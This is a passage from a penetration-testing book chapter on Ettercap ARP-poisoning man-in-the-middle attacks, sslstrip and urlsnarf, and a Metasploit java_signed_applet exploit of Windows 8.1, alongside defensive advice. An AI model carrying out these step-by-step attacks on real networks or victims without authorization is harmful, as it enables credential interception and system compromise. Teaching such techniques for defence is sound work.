- en: Chapter 8. Data Capture and Exploitation
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Welcome! In the previous chapter, we got our hands dirty with several tools
    such as Karmetasploit, Wireshark, and WiFi Pineapple.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this chapter, we will cover the following topics:'
  prefs: []
  type: TYPE_NORMAL
- en: Capturing unencrypted network traffic
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Man-in-the-middle attacks
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Metasploit
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Prevention of threats
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: In the previous chapter, we covered how to sniff traffic, but how does one get
    usernames, passwords, and other sensitive information?
  prefs: []
  type: TYPE_NORMAL
- en: Since this is an advanced technical book, you are expected to have a basic understanding
    of this; however, for your sake we will be covering how this works with a demonstration.
    Feeling confident? No problem. Go right ahead and skip to the demonstrations.
    For those of you still reading, let's begin with learning how to capture encrypted
    traffic.
  prefs: []
  type: TYPE_NORMAL
- en: Capturing unencrypted traffic
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: We know that unencrypted wireless traffic can be viewed in plain text by anyone
    connected to the same wireless network. Your data can be compromised, such as
    your e-mail, instant messages, files over FTP, telnet sessions, HTTP sessions,
    and more. How does this work? When a user uses HTTP to browse a website, the data
    they are transmitted isn't protected end to end, so it can be intercepted and
    recorded by anyone on the same network.
  prefs: []
  type: TYPE_NORMAL
- en: '![Capturing unencrypted traffic](img/3183OS_08_02.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Wireshark is a network analyzer that allows you to view live network packets
    and save the results. Wireshark can be run on Windows, Mac, Linux, and Unix operating
    systems. If a user were to run Wireshark on a network, they could see what websites
    people go to, files that are being transferred, instant messages, and much more.
  prefs: []
  type: TYPE_NORMAL
- en: There are a lot of network services that are vulnerable to network sniffing
    and public networks. Anyone with the right skills and knowledge of Wireshark can
    easily compromise your accounts.
  prefs: []
  type: TYPE_NORMAL
- en: 'To stay secure, always check the following:'
  prefs: []
  type: TYPE_NORMAL
- en: Use WPA or WPA2 encryption
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Always use HTTPS on public networks
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Use SSH or encrypted e-mail for file transfers
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Use a VPN when on public networks
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Use a password manager to log in to websites
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Man-in-the-middle attacks
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: You might have heard of *monkey in the middle*, but have you heard of man-in-the-middle?
    A **man-in-the-middle** (**MITM**) attack is where a user falls victim to a network
    intercept. A malicious user on the network acts like a router in which they grab
    all the network traffic. This includes e-mails, logins, chat messages, and much
    more.
  prefs: []
  type: TYPE_NORMAL
- en: '![Man-in-the-middle attacks](img/3183OS_08_04.jpg)'
  prefs: []
  type: TYPE_IMG
- en: This demonstration is intended to be used for educational purposes only. The
    act of hacking to become more secure is a great skill asset. Performing any kind
    of malicious activity on an unauthorized network without permission is considered
    a crime in most countries. In this next demonstration, we will be using our own
    computer and network.
  prefs: []
  type: TYPE_NORMAL
- en: Open a Terminal and type `leafpad /etc/ettercap/etter.conf`:![Man-in-the-middle
    attacks](img/3183OS_08_06.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: With `etter.conf` opened, look for the words highlighted:![Man-in-the-middle
    attacks](img/3183OS_08_07.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'You will need to change the highlighted code to this:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Man-in-the-middle attacks](img/3183OS_08_08.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Click on **Search** and then on **Find**. Type `iptables` and click on the **Find**
    button:![Man-in-the-middle attacks](img/3183OS_08_09.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'The result should look like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Man-in-the-middle attacks](img/3183OS_08_10.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'You will need to uncomment two of the lines to look like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Man-in-the-middle attacks](img/3183OS_08_11.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Start `Ettercap-gtk` by opening a Terminal and typing `ettercap –G`:![Man-in-the-middle
    attacks](img/3183OS_08_12.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: When Ettercap opens, you will need to click on **Sniff** then select **Unified
    sniffing**:![Man-in-the-middle attacks](img/3183OS_08_13.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Select the interface that is connected to the network:![Man-in-the-middle attacks](img/3183OS_08_14.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: If you are using Wi-Fi, you will be selecting `wlan0` or `wlan1`.
  prefs: []
  type: TYPE_NORMAL
- en: Click on **Hosts** and then select **Scan for hosts**, as shown in the following
    screenshot:![Man-in-the-middle attacks](img/3183OS_08_15.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: In the command box, you should see **hosts added to the host list**. Click on
    **Hosts** and then select **Host List**:![Man-in-the-middle attacks](img/3183OS_08_16.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Select the IP address of the router and then click on the **Add to Target 1**
    button. The following screen appears:![Man-in-the-middle attacks](img/3183OS_08_17.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Select the IP address of the victim and then click on the **Add to Target 2**
    button:![Man-in-the-middle attacks](img/3183OS_08_18.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Click on **Mitm** and then select **Arp poisoning**:![Man-in-the-middle attacks](img/3183OS_08_19.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: When you receive a prompt, check the box next to **Sniff remote connections**
    and click on **OK**:![Man-in-the-middle attacks](img/3183OS_08_20.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Click on **Start** and then select **Start sniffing**.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Ettercap will begin to ARP-poison the victim and the router. Ettercap will display
    any information or data from the victim.
  prefs: []
  type: TYPE_NORMAL
- en: Congratulations! You have successfully conducted a full MITM attack.
  prefs: []
  type: TYPE_NORMAL
- en: If you would like, you can also use tools such as sslstrip and urlsnarf to get
    some additional information from your victim. **sslstrip** is a type of MITM attack
    that forces users to communicate using an HTTP protocol instead of HTTPS in which
    an attacker can view all SSL traffic in plain text. **HTTP Strict Transport Security**
    (**HSTS**) is a security protection mechanism that protects you from this kind
    of threat. It prevents HTTPS from getting downgraded when cookie and browser hijacking
    occurs. **urlsnarf** displays all requested HTTP traffic in the CLF format and
    can be used to analyze web traffic and what websites users visit. It can also
    be used by an attacker to snoop on a user knowing what they are searching and
    visiting on the Internet.
  prefs: []
  type: TYPE_NORMAL
- en: 'To stop the attack, click on **Start** and then select **Stop sniffing**, as
    shown:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Man-in-the-middle attacks](img/3183OS_08_21.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After stopping the attack, Ettercap will send an ARP packet and the network
    will then return to normal within a few minutes. You can protect yourself from
    such attacks by using ARP detection software such as XArp or Snort. Also, assigning
    static ARP entries can help prevent an attack. It will tell the attacker that
    the router's MAC address is permanent and cannot be changed. Therefore, it will
    ignore all ARP packets sent by the attacker.
  prefs: []
  type: TYPE_NORMAL
- en: Metasploit
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Ah yes, Metasploit is the most infamous open source tool available for penetration
    testers and IDS developers! **Metasploit Framework** is a database full of security
    exploits and scripts. It is one of the most popular open source tools for developing
    and executing exploit code against target systems. The Metasploit UI is shown
    in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit](img/3183OS_08_22.jpg)'
  prefs: []
  type: TYPE_IMG
- en: In the next demonstration, we will be exploiting Windows 8.1 via Java vulnerability.
    This vulnerability will allow the attacker to grab system information or hashdump,
    take a picture from a webcam, give administration rights, create and run executables,
    create backdoors, and so on. Let's begin!
  prefs: []
  type: TYPE_NORMAL
- en: 'Open a Terminal and type `msfconsole`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Tip
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: You can also run `server postgresql start` or `service metasploit start`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit](img/3183OS_08_24.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now type `search java_signed_applet`:![Metasploit](img/3183OS_08_25.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Then type `use exploit/multi/browser/java_signed_applet`:![Metasploit](img/3183OS_08_26.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Now type `set SRVHOST <IPADDRESS>`:![Metasploit](img/3183OS_08_27.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Tip
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Replace `<IPADDRESS>` with your Kali Linux IP address.
  prefs: []
  type: TYPE_NORMAL
- en: Type `exploit`:![Metasploit](img/3183OS_08_28.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: On the victim's system, navigate to the URL link provided by Metasploit. You
    should receive the following:![Metasploit](img/3183OS_08_29.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'JVM should put a prompt on the victim''s system asking whether they trust the
    signed applet. If the user is running an older version of Java, it will display
    **UNKNOWN**. Once the user clicks on **Run**, the Java applet will execute, therefore
    exploiting Java to create a Meterpreter session in Metasploit:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Metasploit](img/3183OS_08_30.jpg)'
  prefs: []
  type: TYPE_IMG
- en: While in Meterpreter, type `sysinfo` to confirm your success.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Congratulations! You have successfully exploited the Windows 8.1 operating system.
  prefs: []
  type: TYPE_NORMAL
- en: 'To protect yourself from such attacks, please consider the following:'
  prefs: []
  type: TYPE_NORMAL
- en: Disable Java if you aren't going to use it
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Increase Java's security level
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Allow only trusted sources from Java
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Visit only trusted websites and remote servers
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Enable Windows Defender or other security software
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Preventions
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'The following is a summary of all the preventions discussed in this chapter:'
  prefs: []
  type: TYPE_NORMAL
- en: Use SSH or encrypted e-mail for file transfers
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Use a VPN when on public networks
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Use a password manager to log in to websites
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Using ARP detection software such as XArp or Snort
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Assign static ARP entries
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Disable Java if you aren't going to use it
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Increase Java's security level
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Allow only trusted sources from Java
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Visit only trusted websites and remote servers
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Enable Windows Defender or other security software
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Download and install software updates
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Download and install operating system updates
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Again, this all depends on the user's computer behavior. If the user is connecting
    to a public network, they could possibly be a victim of an MITM attack. If a user
    is pirating software or movies, they could be a victim of a vulnerability attack.
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: I hope you enjoyed this chapter as much as I did. The hands-on demonstrations
    should have proved to be a good mind opener and broaden your sense of security
    to further protect yourself and others from attacks.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this chapter, we covered the following:'
  prefs: []
  type: TYPE_NORMAL
- en: How to capture unencrypted traffic with protocols such as HTTP, FTP, and Telnet
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: How to protect yourself using encryption
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: What man-in-the-middle attacks are
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: A demonstration of a man-in-the-middle attack
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: How to protect yourself from man-in-the-middle attacks
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: What Metasploit is
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: A demonstration of Metasploit
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: How to protect yourself from Metasploit attacks
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: In the next chapter, you will learn how to pivot through a local network to
    access other systems and devices. We will also be documenting our work and cleaning
    up at the end. See you in [Chapter 9](ch09.html "Chapter 9. Post-Exploitation"),
    *Post-Exploitation*!
  prefs: []
  type: TYPE_NORMAL
